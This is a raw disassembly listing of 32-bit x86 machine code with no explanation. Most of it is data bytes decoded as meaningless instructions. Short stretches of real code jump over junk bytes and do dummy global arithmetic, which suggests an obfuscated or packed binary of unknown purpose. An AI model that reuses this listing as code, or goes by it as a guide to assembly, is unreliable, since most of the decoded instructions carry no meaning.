  407c18:	aad    0x11
  407c1a:	adc    DWORD PTR [ecx],edi
  407c1c:	pop    edi
  407c1d:	mov    ah,0x5c
  407c1f:	or     al,0xa6
  407c21:	test   al,0xba
  407c23:	(bad)  
  407c24:	inc    DWORD PTR [edx-0x4e78e0d2]
  407c2a:	or     ah,BYTE PTR [ebx+0x63b701c9]
  407c30:	shl    BYTE PTR [edx-0x5b9f6b57],1
  407c36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c37:	sbb    esp,esp
  407c39:	getsec 
  407c3b:	mov    eax,DWORD PTR [edi-0x6d09a342]
  407c41:	dec    ebx
  407c42:	xor    esi,DWORD PTR [edx+0x65255118]
  407c48:	adc    ah,bl
  407c4a:	jae    0x407be4
  407c4c:	(bad)  
  407c4e:	pop    ebx
  407c4f:	cdq    
  407c50:	leave  
  407c51:	mov    dl,BYTE PTR [edx-0x19dc0e49]
  407c57:	rol    BYTE PTR [esi+0x30],cl
  407c5a:	xor    esp,DWORD PTR [ecx-0x6fda9835]
  407c60:	jno    0x407c99
  407c62:	adc    DWORD PTR [edi+esi*4],0xffffff91
  407c66:	in     eax,0xc5
  407c68:	adc    eax,eax
  407c6a:	sahf   
  407c6b:	sbb    DWORD PTR [eax],edi
  407c6d:	xor    DWORD PTR [ebx+eiz*4],ebx
  407c70:	xor    BYTE PTR [edx+0x49b636ed],0x95
  407c77:	and    DWORD PTR [eax-0x587a9884],ecx
  407c7d:	ror    BYTE PTR [esi],cl
  407c7f:	pop    eax
  407c80:	out    0x82,al
  407c82:	push   ss
  407c83:	pop    ebx
  407c84:	fimul  DWORD PTR [ecx]
  407c86:	push   0x69
  407c88:	push   0x286192a2
  407c8d:	add    BYTE PTR [ecx+0x6bb73668],cl
  407c93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c95:	stc    
  407c96:	push   ss
  407c97:	(bad)  
  407c98:	ret    0x193a
  407c9b:	sar    BYTE PTR [ebx+esi*1],0x75
  407c9f:	adc    al,0x3f
  407ca1:	adc    bh,BYTE PTR [edi]
  407ca3:	dec    esi
  407ca4:	jno    0x407cd4
  407ca6:	cmp    BYTE PTR [ebx],bh
  407ca8:	js     0x407c8f
  407caa:	fwait
  407cab:	inc    ebx
  407cac:	in     eax,dx
  407cad:	ins    BYTE PTR es:[edi],dx
  407cae:	mov    edi,esi
  407cb0:	int3   
  407cb1:	push   0x18ae32c7
  407cb6:	out    dx,al
  407cb7:	mov    ah,0xfc
  407cb9:	fstp   DWORD PTR [edi-0x659aa3ca]
  407cbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cc0:	arpl   WORD PTR [edi-0x7f],di
  407cc3:	and    eax,0xa2eec054
  407cc8:	in     al,0xea
  407cca:	mov    al,ds:0xc14448c5
  407ccf:	int    0xf1
  407cd1:	and    al,0xe0
  407cd3:	int    0x39
  407cd5:	cmp    ebx,DWORD PTR [edi+ebp*8]
  407cd8:	aad    0x7b
  407cda:	das    
  407cdb:	outs   dx,DWORD PTR ds:[esi]
  407cdc:	adc    ch,bl
  407cde:	shr    BYTE PTR [edx+0x44b958fe],1
  407ce4:	mov    DWORD PTR [edx+edi*1],esi
  407ce7:	mov    dl,0xd2
  407ce9:	jo     0x407d17
  407ceb:	push   edx
  407cec:	sbb    BYTE PTR [esi],bl
  407cee:	and    esp,DWORD PTR [ecx-0xe]
  407cf1:	inc    ebp
  407cf2:	push   ebp
  407cf3:	pop    es
  407cf4:	imul   ecx,DWORD PTR [ebx],0xf3c8226d
  407cfa:	ds push ebp
  407cfc:	add    DWORD PTR [edx-0x6682f318],esp
  407d02:	outs   dx,BYTE PTR ds:[esi]
  407d03:	jmp    0x407d2d
  407d05:	jmp    FWORD PTR [ebp-0x1a]
  407d08:	mov    ds:0x3c409ec,eax
  407d0d:	mov    edi,?
  407d0f:	das    
  407d10:	sbb    al,0x52
  407d12:	(bad)  
  407d13:	aam    0xd6
  407d15:	adc    bl,BYTE PTR [eax]
  407d17:	icebp  
  407d18:	or     edi,DWORD PTR [eax-0x5d]
  407d1b:	push   edx
  407d1c:	mov    ah,0xf8
  407d1e:	lods   eax,DWORD PTR ds:[esi]
  407d1f:	lds    esi,FWORD PTR [ebx+edx*4]
  407d22:	pop    ebx
  407d23:	pop    edi
  407d24:	xchg   esi,esi
  407d26:	mov    cl,0x89
  407d28:	dec    esp
  407d29:	pop    ebx
  407d2a:	adc    eax,0x825b94c3
  407d2f:	adc    al,0x2d
  407d31:	inc    eax
  407d32:	adc    ecx,DWORD PTR [ecx]
  407d34:	aad    0x8
  407d36:	push   ds
  407d37:	pusha  
  407d38:	in     eax,dx
  407d39:	pop    esi
  407d3a:	mov    bh,0x58
  407d3c:	and    BYTE PTR [edx],bh
  407d3e:	sub    DWORD PTR [edi-0x67],ecx
  407d41:	cmc    
  407d42:	push   edi
  407d43:	fs xor al,0x79
  407d46:	into   
  407d47:	xor    eax,0x595d8187
  407d4c:	sub    edi,DWORD PTR [ebp-0x6823cc77]
  407d52:	jns    0x407d83
  407d54:	and    ecx,DWORD PTR [edi]
  407d56:	(bad)  
  407d58:	jne    0x407d31
  407d5a:	push   ebp
  407d5b:	dec    ecx
  407d5c:	mov    bl,0x25
  407d5e:	ins    DWORD PTR es:[edi],dx
  407d5f:	pop    eax
  407d60:	std    
  407d61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d62:	or     DWORD PTR [ebx],eax
  407d64:	in     eax,dx
  407d65:	dec    edx
  407d66:	xchg   ebx,eax
  407d67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d68:	push   ebp
  407d69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d6a:	dec    edi
  407d6b:	xchg   edi,edx
  407d6d:	xchg   BYTE PTR [ebx],bl
  407d6f:	xor    ah,dl
  407d71:	xor    cl,BYTE PTR [edx+0x552c550f]
  407d77:	ins    DWORD PTR es:[edi],dx
  407d78:	in     eax,dx
  407d79:	pop    ebx
  407d7a:	cld    
  407d7b:	rcr    DWORD PTR [ecx+0x72],0x32
  407d7f:	add    eax,0xec794f5a
  407d84:	mov    ds:0x9161962e,eax
  407d89:	nop
  407d8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d8b:	jbe    0x407d30
  407d8d:	jmp    0xd74e4205
  407d92:	mov    cl,0xf1
  407d94:	fidivr DWORD PTR [esi+0x4a]
  407d97:	scas   eax,DWORD PTR es:[edi]
  407d98:	das    
  407d99:	jne    0x407dde
  407d9b:	mov    ch,0x9a
  407d9d:	imul   DWORD PTR [edx-0x4c]
  407da0:	rcl    BYTE PTR ds:0xae7a7f5c,0xca
  407da7:	sbb    al,0xc7
  407da9:	or     BYTE PTR ds:0xb8e683a1,0xd9
  407db0:	bound  esp,QWORD PTR [eax]
  407db2:	cwde   
  407db3:	push   cs
  407db4:	inc    edx
  407db5:	push   edi
  407db6:	xlat   BYTE PTR ds:[ebx]
  407db7:	mov    dh,0x2
  407db9:	or     al,0xec
  407dbb:	add    esp,ebp
  407dbd:	or     esp,ecx
  407dbf:	mov    DWORD PTR [ecx+0xa],eax
  407dc2:	xchg   ch,dl
  407dc4:	adc    esi,edx
  407dc6:	adc    al,0x66
  407dc8:	imul   eax,DWORD PTR [ebx-0x58],0x25
  407dcc:	push   es
  407dcd:	cdq    
  407dce:	scas   eax,DWORD PTR es:[edi]
  407dcf:	test   DWORD PTR ds:0xe3447ae1,edi
  407dd5:	jge    0x407d69
  407dd7:	fsubp  st(0),st
  407dd9:	sub    al,0xd8
  407ddb:	mul    BYTE PTR [edi+0x3850d822]
  407de1:	cmp    BYTE PTR [ebx],bl
  407de3:	sub    BYTE PTR [edi+0x24],bl
  407de6:	test   DWORD PTR [edi+0x7eda1f47],eax
  407dec:	dec    esi
  407ded:	lods   al,BYTE PTR ds:[esi]
  407dee:	jecxz  0x407e2d
  407df0:	mov    ebx,0xa7a6b23f
  407df5:	int    0xfa
  407df7:	and    bh,BYTE PTR [ebx+ecx*8]
  407dfa:	push   ebx
  407dfb:	stc    
  407dfc:	clc    
  407dfd:	push   cs
  407dfe:	mov    ebp,0x5e8d64e2
  407e03:	xchg   ebx,eax
  407e04:	loope  0x407dc9
  407e06:	lock stos DWORD PTR es:[edi],eax
  407e08:	sti    
  407e09:	push   ss
  407e0a:	mov    cl,0xe5
  407e0c:	lahf   
  407e0d:	jmp    0x407dc6
  407e0f:	mov    esi,0xf49ea58e
  407e14:	and    dl,BYTE PTR [ebp+0x28]
  407e17:	cmp    ch,BYTE PTR [edx]
  407e19:	imul   ebp,esi,0xffffffd1
  407e1c:	push   cs
  407e1d:	nop
  407e1e:	sbb    al,0x10
  407e20:	xor    ebp,eax
  407e22:	cmp    esp,edi
  407e24:	les    edi,FWORD PTR [edi]
  407e26:	cmp    BYTE PTR [edi+0x25],cl
  407e29:	push   0xffffffe4
  407e2b:	adc    al,BYTE PTR [ecx-0x7f23c23e]
  407e31:	mov    ds:0x90354cec,al
  407e36:	jbe    0x407e63
  407e38:	cli    
  407e39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e3a:	shr    DWORD PTR [eax-0x46d0274e],0x51
  407e41:	jne    0x407dfb
  407e43:	leave  
  407e44:	or     DWORD PTR [edi],edx
  407e46:	jmp    0x407e3a
  407e48:	sar    cl,cl
  407e4a:	rcl    BYTE PTR [eax],cl
  407e4c:	lock jo 0x407dfd
  407e4f:	jle    0x407e00
  407e51:	jne    0x407e45
  407e53:	or     esp,DWORD PTR [edi+0x7faa54da]
  407e59:	scas   eax,DWORD PTR es:[edi]
  407e5a:	mov    cl,BYTE PTR [edx-0x5c]
  407e5d:	mov    esi,0xbca2c616
  407e62:	mov    ebx,0xa671514f
  407e67:	out    dx,eax
  407e68:	sbb    dh,dl
  407e6a:	(bad)  
  407e6c:	ud1    eax,DWORD PTR [edi+0x5aea3d86]
  407e73:	cmp    DWORD PTR [edx-0x435f613d],eax
  407e79:	push   ecx
  407e7a:	ja     0x407e92
  407e7c:	dec    ebx
  407e7d:	push   edi
  407e7e:	icebp  
  407e7f:	xlat   BYTE PTR ds:[ebx]
  407e80:	repnz mov ds:0xaf26de69,eax
  407e86:	call   0x9bc7430e
  407e8b:	jl     0x407e7e
  407e8d:	push   eax
  407e8e:	inc    edi
  407e8f:	pushf  
  407e90:	mov    esp,0x24af9986
  407e95:	xchg   ebx,eax
  407e96:	pop    es
  407e97:	xchg   esi,eax
  407e98:	jmp    0x407ef9
  407e9a:	mov    eax,0xa84968b2
  407e9f:	dec    ecx
  407ea0:	inc    edi
  407ea1:	test   al,0xab
  407ea3:	or     esi,DWORD PTR [edi+0x48fae3f]
  407ea9:	lods   al,BYTE PTR ds:[esi]
  407eaa:	cmp    DWORD PTR [ebp+0x21f6e0e5],0x42c6c258
  407eb4:	xor    eax,DWORD PTR [edx]
  407eb6:	fidiv  DWORD PTR [ecx-0x73]
  407eb9:	rcr    DWORD PTR [ebp+0x5048970b],1
  407ebf:	out    dx,al
  407ec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ec1:	mov    DWORD PTR [esp+ebp*2-0x8],ebx
  407ec5:	dec    esi
  407ec6:	mov    edx,0x42a527f7
  407ecb:	mov    DWORD PTR [ebx+0x45],ecx
  407ece:	cld    
  407ecf:	push   eax
  407ed0:	xlat   BYTE PTR ds:[ebx]
  407ed1:	mov    esp,0x3e825a9c
  407ed6:	lahf   
  407ed7:	jno    0x407f56
  407ed9:	push   ebp
  407eda:	aad    0xf9
  407edc:	int3   
  407edd:	dec    ebx
  407ede:	scas   al,BYTE PTR es:[edi]
  407edf:	lock xchg BYTE PTR [ecx-0x6147038b],al
  407ee6:	adc    al,0xe
  407ee8:	mov    ax,WORD PTR [ebp-0x8]
  407eec:	push   DWORD PTR [ebp+0x8]
  407eef:	call   0x407f00
  407ef4:	test   eax,eax
  407ef6:	je     0x407ee1
  407efc:	leave  
  407efd:	ret    0x4
  407f00:	push   ebp
  407f01:	mov    ebp,esp
  407f03:	sub    esp,0x2c
  407f06:	or     DWORD PTR ds:0x43376f,edi
  407f0c:	jmp    0x408093
  407f11:	outs   dx,DWORD PTR ds:[esi]
  407f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f13:	ins    BYTE PTR es:[edi],dx
  407f14:	inc    edi
  407f15:	jne    0x407f6c
  407f17:	jne    0x407ecf
  407f19:	push   ss
  407f1a:	push   ds
  407f1b:	mov    ch,0xcc
  407f1d:	inc    edi
  407f1e:	div    BYTE PTR [edx+0x1]
  407f21:	sub    dl,dh
  407f23:	jle    0x407fa3
  407f25:	in     al,0x7f
  407f27:	jle    0x407fa7
  407f29:	jne    0x407ecd
  407f2b:	add    al,0x98
  407f2d:	jecxz  0x407fa6
  407f2f:	pop    DWORD PTR fs:[si]
  407f33:	sete   ah
  407f36:	lahf   
  407f37:	adc    eax,0xa3db2503
  407f3c:	loope  0x407f53
  407f3e:	test   al,0x73
  407f40:	cmp    dh,bl
  407f42:	or     bh,BYTE PTR [edx+0x8]
  407f45:	fstp   DWORD PTR [ecx]
  407f47:	jb     0x407f71
  407f49:	fstp   DWORD PTR [esi-0x39]
  407f4c:	jp     0x407ecf
  407f4e:	jmp    0xd597:0xdb96d5a6
  407f55:	fucomip st,st(2)
  407f57:	cmp    esp,ebp
  407f59:	pop    es
  407f5a:	bound  ecx,QWORD PTR [edi+0x31]
  407f5d:	nop
  407f5e:	cmp    dl,BYTE PTR [ecx+0x7a04bcfb]
  407f64:	mov    eax,0x7dc36da5
  407f69:	aaa    
  407f6a:	pop    ecx
  407f6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f6c:	hlt    
  407f6d:	ja     0x407f9b
  407f6f:	mov    edx,0x5ff5043c
  407f74:	out    0x4b,al
  407f76:	jmp    0x3d02:0x319b68d0
  407f7d:	scas   eax,DWORD PTR es:[edi]
  407f7e:	cmc    
  407f7f:	pop    ecx
  407f80:	jecxz  0x407f15
  407f82:	call   0xca25eeb1
  407f87:	popf   
  407f88:	push   ss
  407f89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f8a:	call   0x21695104
  407f8f:	push   ebx
  407f90:	mov    edx,0xcdf605da
  407f95:	dec    edx
  407f96:	add    dl,BYTE PTR [eax-0x9]
  407f99:	add    BYTE PTR [ecx-0x5e159588],dh
  407f9f:	pop    ebp
  407fa0:	rcl    DWORD PTR ds:0x2395ce31,0xb2
  407fa7:	out    dx,al
  407fa8:	rol    BYTE PTR [edi-0x140bec2],1
  407fae:	mov    bl,0xa3
  407fb0:	shr    BYTE PTR [ebp-0x2a2dbe81],1
  407fb6:	and    cl,BYTE PTR [edi-0xdfe10ff]
  407fbc:	xor    DWORD PTR [edx+esi*4+0xa],0x214233cd
  407fc4:	xor    DWORD PTR [edx-0x1491851d],0xad70c6ca
  407fce:	lock mov ah,0xbd
  407fd1:	inc    eax
  407fd2:	jecxz  0x407fca
  407fd4:	pop    es
  407fd5:	and    ecx,ecx
  407fd7:	inc    edi
  407fd8:	out    0x4e,al
  407fda:	sub    ecx,DWORD PTR [ebx-0x6b]
  407fdd:	loop   0x40804d
  407fdf:	test   DWORD PTR ds:0xd6abb809,ebp
  407fe5:	in     eax,0xd0
  407fe7:	jns    0x407f96
  407fe9:	dec    eax
  407fea:	xor    eax,0x38e3bc9d
  407fef:	bound  ebp,QWORD PTR [ecx+ecx*4+0x42702d16]
  407ff6:	popf   
  407ff7:	xor    DWORD PTR [ebx+0x515bfb2d],ecx
  407ffd:	ss dec ebx
  407fff:	daa    
  408000:	pop    ebp
  408001:	jecxz  0x408006
  408003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408004:	(bad)  
  408006:	mov    edx,eax
  408008:	outs   dx,BYTE PTR ds:[esi]
  408009:	dec    ebp
  40800a:	sbb    al,0xaa
  40800c:	iret   
  40800d:	sbb    edi,DWORD PTR [ebp+0x5b]
  408010:	jp     0x407fea
  408012:	mov    ebx,DWORD PTR [ebp-0x38]
  408015:	out    dx,al
  408016:	jmp    0x7132:0x3e7c569f
  40801d:	pop    ebx
  40801e:	das    
  40801f:	cmp    esi,esi
  408021:	hlt    
  408022:	pop    ss
  408023:	outs   dx,DWORD PTR ds:[esi]
  408024:	dec    edi
  408025:	mov    edx,0x7a42ed98
  40802a:	jnp    0x408039
  40802c:	mov    DWORD PTR [ebp-0x4dfb391e],0xd0262dd9
  408036:	inc    esp
  408037:	cmp    DWORD PTR [ecx],edi
  408039:	push   edi
  40803a:	iret   
  40803b:	pusha  
  40803c:	sbb    edx,ebp
  40803e:	jnp    0x407ff4
  408040:	or     BYTE PTR [ebx],dl
  408042:	jle    0x407fd0
  408044:	mov    esp,0x43c897aa
  408049:	sub    DWORD PTR [ecx],eax
  40804b:	xlat   BYTE PTR ds:[ebx]
  40804c:	xor    BYTE PTR ds:0x5c1e83dc,ch
  408052:	sub    bl,dh
  408054:	clc    
  408055:	test   ebx,0x47c2732e
  40805b:	cli    
  40805c:	mov    DWORD PTR [edx+0x496933d0],0x3270618e
  408066:	and    dh,dl
  408068:	jmp    0x4080b7
  40806a:	leave  
  40806b:	jp     0x408002
  40806d:	push   ecx
  40806e:	push   0xfd9aa160
  408073:	pop    ecx
  408074:	add    ah,BYTE PTR [edi+esi*1+0x2d]
  408078:	jmp    0xd2cd:0x5c51c7b6
  40807f:	sub    eax,0x2a3e2421
  408084:	pusha  
  408085:	test   eax,0xde34735c
  40808a:	pop    eax
  40808c:	into   
  40808d:	fbld   TBYTE PTR [ecx]
  40808f:	xchg   ebx,eax
  408090:	test   BYTE PTR [edi],ch
  408092:	pop    ds
  408093:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40809a:	inc    ecx
  40809b:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4080a2:	mov    eax,0x9577
  4080a7:	mov    ecx,DWORD PTR ds:0x433727
  4080ad:	xor    DWORD PTR ds:0x433833,ecx
  4080b3:	mov    WORD PTR [ebp-0x4],ax
  4080b7:	inc    DWORD PTR ds:0x433837
  4080bd:	lea    eax,[ebp-0x24]
  4080c0:	mov    DWORD PTR [ebp-0x28],eax
  4080c3:	sbb    ecx,0x45b9
  4080c9:	mov    eax,DWORD PTR [ebp+0x8]
  4080cc:	mov    DWORD PTR [ebp-0x20],eax
  4080cf:	push   ebx
  4080d0:	movzx  ecx,WORD PTR ds:0x4337fb
  4080d7:	add    ecx,DWORD PTR ds:0x43371b
  4080dd:	mov    DWORD PTR ds:0x4337fb,ecx
  4080e3:	lea    eax,[ebp-0x18]
  4080e6:	mov    DWORD PTR [ebp-0x1c],eax
  4080e9:	mov    eax,DWORD PTR [ebp-0x1c]
  4080ec:	and    DWORD PTR ds:0x433767,edx
  4080f2:	push   esi
  4080f3:	or     DWORD PTR ds:0x433783,ebx
  4080f9:	push   edi
  4080fa:	add    DWORD PTR ds:0x43371f,ebx
  408100:	mov    edi,0xf89f2da9
  408105:	mov    DWORD PTR [eax],edi
  408107:	and    DWORD PTR ds:0x4337b3,0x0
  408111:	jmp    0x408121
  408116:	mov    eax,ds:0x4337b3
  40811b:	inc    eax
  40811c:	mov    ds:0x4337b3,eax
  408121:	cmp    DWORD PTR ds:0x4337b3,0x11
  408128:	jae    0x408163
  40812e:	cmp    DWORD PTR ds:0x4337b3,0x4
  408135:	jne    0x408146
  40813b:	push   0x1543
  408140:	call   DWORD PTR ds:0x412390
  408146:	cmp    DWORD PTR ds:0x4337b3,0x3
  40814d:	jne    0x40815e
  408153:	mov    eax,ds:0x4337b3
  408158:	inc    eax
  408159:	mov    ds:0x4337b3,eax
  40815e:	jmp    0x408116
  408163:	mov    eax,DWORD PTR [ebp-0x14]
  408166:	mov    ebx,DWORD PTR [ebp-0x8]
  408169:	mov    ecx,0x7510854
  40816e:	mov    DWORD PTR ds:0x43376b,0x500e
  408178:	jmp    0x4082ff
  40817d:	xor    dl,BYTE PTR [esi+0x23]
  408180:	inc    edi
  408181:	arpl   WORD PTR [ebx+0x72],si
  408184:	jae    0x408123
  408186:	aas    
  408187:	or     eax,0xa9bc3c8b
  40818c:	inc    esp
  40818d:	nop
  40818e:	xlat   BYTE PTR ds:[ebx]
  40818f:	jle    0x40820f
  408191:	in     al,0x7f
  408193:	jle    0x408213
  408195:	mov    dh,0xf2
  408197:	inc    ebp
  408198:	(bad)  
  408199:	sub    DWORD PTR [ebx],0x5f8678b1
  40819f:	sahf   
  4081a0:	add    bl,BYTE PTR [eax]
  4081a2:	cld    
  4081a3:	push   esp
  4081a4:	xor    DWORD PTR [edx-0x5e],esi
  4081a7:	pop    ss
  4081a8:	int3   
  4081a9:	inc    edx
  4081aa:	out    0xe4,eax
  4081ac:	mov    esi,0xb81cb4b4
  4081b1:	in     al,0xae
  4081b3:	js     0x408192
  4081b5:	jmp    0x408168
  4081b7:	pop    ebp
  4081b8:	ror    BYTE PTR [eax+0x37],1
  4081bb:	mov    al,ds:0xcf04af1a
  4081c0:	xor    esi,DWORD PTR [edi-0x3304a336]
  4081c6:	mov    bl,0xfc
  4081c8:	mov    ch,BYTE PTR [ebx]
  4081ca:	add    eax,DWORD PTR [ebx-0x27]
  4081cd:	dec    edx
  4081ce:	call   0x1fb0:0x39325cff
  4081d5:	mov    esp,0xde293060
  4081da:	push   cs
  4081db:	mov    ecx,0x64024fb9
  4081e0:	cmc    
  4081e1:	and    DWORD PTR [esi+0x36],esp
  4081e4:	rcr    ecx,1
  4081e6:	dec    eax
  4081e7:	push   eax
  4081e8:	add    DWORD PTR [eax-0x56],ebx
  4081eb:	sub    DWORD PTR [ecx-0x71],ecx
  4081ee:	pop    edx
  4081ef:	add    BYTE PTR [ebx+0x6a],0x5d
  4081f3:	xchg   ebp,eax
  4081f4:	(bad)  
  4081f6:	jns    0x408223
  4081f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081f9:	pop    ebx
  4081fa:	test   bl,ah
  4081fc:	cmp    ecx,esp
  4081fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081ff:	pop    edi
  408200:	push   cs
  408201:	fistp  QWORD PTR [edi]
  408203:	loopne 0x40821e
  408205:	dec    ebx
  408206:	mov    ?,WORD PTR [eax-0x13]
  408209:	add    al,0xc7
  40820b:	sub    BYTE PTR [ebp+0x5b],bh
  40820e:	aad    0x2f
  408210:	lods   eax,DWORD PTR ds:[esi]
  408211:	pop    ds
  408212:	mov    ds:0x5cd8f4d5,eax
  408217:	div    BYTE PTR [edi-0x54]
  40821a:	push   esi
  40821b:	mov    esp,DWORD PTR [esi+0x2ac795e9]
  408221:	add    BYTE PTR [ecx+0x2a],dh
  408224:	aam    0x79
  408226:	mov    BYTE PTR [ebp-0x189479a6],dh
  40822c:	xor    DWORD PTR fs:[ecx],0x4829c7e6
  408233:	stc    
  408234:	dec    esp
  408235:	imul   eax,ebp,0xcddeb6c
  40823b:	dec    ebx
  40823c:	imul   ebp,DWORD PTR [ebx],0xfffffff1
  40823f:	das    
  408240:	es jl  0x408264
  408243:	inc    esp
  408244:	dec    ecx
  408245:	or     al,0x2a
  408247:	aam    0x7c
  408249:	mov    ds:0xe37e97e5,eax
  40824e:	cmc    
  40824f:	pop    esi
  408250:	inc    ebx
  408251:	sub    ebx,DWORD PTR [ebx+0x160eaab5]
  408257:	xchg   BYTE PTR [ecx+0x24b717a2],bl
  40825d:	mov    esp,0x7f2b92
  408262:	mov    ah,0xa7
  408264:	jge    0x408226
  408266:	jl     0x408234
  408268:	jmp    0x408201
  40826a:	mov    esp,0xa96cc5ea
  40826f:	mov    dh,BYTE PTR [edx]
  408271:	xor    eax,0x608aab66
  408276:	jp     0x408201
  408278:	popf   
  408279:	or     eax,0x4840ca9d
  40827e:	sbb    ebp,DWORD PTR [ebp+0x6d]
  408281:	stos   BYTE PTR es:[edi],al
  408282:	pop    ecx
  408283:	ds out 0x45,eax
  408286:	cli    
  408287:	xor    BYTE PTR [eax-0x1f],0xf8
  40828b:	xor    BYTE PTR [ebx],bh
  40828d:	scas   eax,DWORD PTR es:[edi]
  40828e:	das    
  40828f:	stos   BYTE PTR es:[edi],al
  408290:	jno    0x408217
  408292:	stos   DWORD PTR es:[edi],eax
  408293:	imul   esi,DWORD PTR [eax+edx*8-0x79fa127e],0xc5fc31e3
  40829e:	or     esi,eax
  4082a0:	dec    edi
  4082a1:	sbb    DWORD PTR [eax],edi
  4082a3:	add    BYTE PTR [eax+0x5f],0xe9
  4082a7:	cmp    BYTE PTR [esi+eax*8+0x24],0xb3
  4082ac:	or     BYTE PTR [eax+0xf2dcc1e],dl
  4082b2:	xchg   DWORD PTR [edi-0x4760382e],ebp
  4082b8:	push   edi
  4082b9:	and    BYTE PTR [ebp-0x557c0dca],dl
  4082bf:	addr16 xchg edx,eax
  4082c1:	pop    esp
  4082c2:	add    eax,0x663fff57
  4082c7:	(bad)  
  4082c8:	ja     0x408258
  4082ca:	or     eax,0x65e41927
  4082cf:	mov    dh,0xce
  4082d1:	iret   
  4082d2:	cmp    ch,BYTE PTR [esi]
  4082d4:	mov    bl,0xc9
  4082d6:	call   0xc345:0xedf49127
  4082dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082de:	(bad)  
  4082df:	mov    ebx,0xb10cd50c
  4082e4:	sti    
  4082e5:	sbb    esi,ecx
  4082e7:	and    dh,BYTE PTR [edx+eiz*8]
  4082ea:	shr    ch,cl
  4082ec:	pop    ecx
  4082ed:	dec    ecx
  4082ee:	sub    ebp,esi
  4082f0:	fnstcw WORD PTR [edx+0x7bf65b3]
  4082f6:	test   al,0x4f
  4082f8:	out    0x8,al
  4082fa:	sbb    edi,DWORD PTR [ebp+0x67]
  4082fd:	mov    esp,0x81c133e0
  408302:	and    eax,0x43377f
  408307:	jo     0x40831c
  408309:	add    BYTE PTR [eax],al
  40830b:	mov    esi,0x32729b
  408310:	add    DWORD PTR ds:0x433723,0x35ec
  40831a:	xor    ebx,ecx
  40831c:	xor    DWORD PTR ds:0x4337af,0x433843
  408326:	xor    edx,edx
  408328:	add    DWORD PTR ds:0x4337bf,0x300c
  408332:	add    eax,esi
  408334:	add    ebx,esi
  408336:	div    ebx
  408338:	mov    DWORD PTR ds:0x43377b,0x2005
  408342:	mov    edx,DWORD PTR [ebp-0x20]
  408345:	mov    DWORD PTR ds:0x43371b,0x2cd7
  40834f:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  408356:	mov    DWORD PTR ds:0x4337ff,0x77f0
  408360:	cmp    eax,DWORD PTR [edx]
  408362:	mov    DWORD PTR ds:0x433773,0x5769
  40836c:	jmp    0x4084f3
  408371:	or     ebx,ecx
  408373:	add    DWORD PTR [ecx+eax*8],ecx
  408376:	aam    0x11
  408378:	retf   
  408379:	imul   esp,edx,0xffffffd8
  40837c:	mov    eax,0x5fec8b53
  408381:	push   es
  408382:	aad    0x7e
  408384:	jle    0x40836a
  408386:	jg     0x408406
  408388:	jle    0x4083dc
  40838a:	xchg   ecx,eax
  40838b:	je     0x4083b8
  40838d:	jle    0x4083bb
  40838f:	jg     0x40838c
  408391:	aad    0x6c
  408393:	xor    BYTE PTR [eax],cl
  408395:	inc    ebp
  408396:	fiadd  WORD PTR [eax]
  408398:	shr    DWORD PTR [ebx-0x607beb45],0x73
  40839f:	pop    es
  4083a0:	(bad)  
  4083a2:	jmp    0x6154:0x5e01e3c7
  4083a9:	(bad)  
  4083aa:	xchg   ebp,eax
  4083ab:	lods   eax,DWORD PTR ds:[esi]
  4083ac:	sub    eax,DWORD PTR ds:0x54a7ca79
  4083b2:	(bad)  
  4083b3:	fmul   QWORD PTR [eax]
  4083b5:	outs   dx,DWORD PTR ds:[esi]
  4083b6:	inc    ebx
  4083b7:	ret    0x146d
  4083ba:	aaa    
  4083bb:	or     al,0x87
  4083bd:	pop    edi
  4083be:	or     edx,DWORD PTR [eax+0x12]
  4083c1:	outs   dx,BYTE PTR ds:[esi]
  4083c2:	push   ebx
  4083c3:	xchg   ebx,eax
  4083c4:	outs   dx,BYTE PTR ds:[esi]
  4083c5:	xchg   ebx,eax
  4083c6:	mov    gs,WORD PTR [ecx]
  4083c8:	inc    edx
  4083c9:	daa    
  4083ca:	jmp    0x40837b
  4083cc:	dec    edi
  4083cd:	jne    0x408357
  4083cf:	and    BYTE PTR [ecx],dh
  4083d1:	sbb    BYTE PTR [ebp-0x67],0xe1
  4083d5:	mov    WORD PTR [edi-0x78],gs
  4083d8:	psubsb mm1,QWORD PTR [ebp-0x30]
  4083dc:	daa    
  4083dd:	int3   
  4083de:	(bad)  
  4083df:	call   0x5e3ae40a
  4083e4:	enter  0x96ec,0x52
  4083e8:	call   0x72d9f79a
  4083ed:	lds    eax,FWORD PTR [ebx+ebx*4-0x37]
  4083f1:	xor    al,0x9
  4083f3:	(bad)  
  4083f4:	fisttp WORD PTR [ebp-0x66]
  4083f7:	(bad)  
  4083f9:	mov    al,ds:0x9633add3
  4083fe:	loop   0x4083dc
  408400:	faddp  st(6),st
  408402:	out    0x89,al
  408404:	sbb    DWORD PTR [edx],0x85c8b604
  40840a:	cmp    DWORD PTR [edi-0x310cc87e],ecx
  408410:	inc    eax
  408411:	adc    BYTE PTR [esi+0x57b973fa],dl
  408417:	icebp  
  408418:	inc    ebp
  408419:	add    BYTE PTR [ebx+0x6809ae41],0x8d
  408420:	outs   dx,BYTE PTR ds:[esi]
  408421:	outs   dx,DWORD PTR ds:[esi]
  408422:	or     ebp,DWORD PTR [ebp+edi*1-0x5c]
  408426:	pop    eax
  408427:	pop    ebx
  408428:	xchg   esi,eax
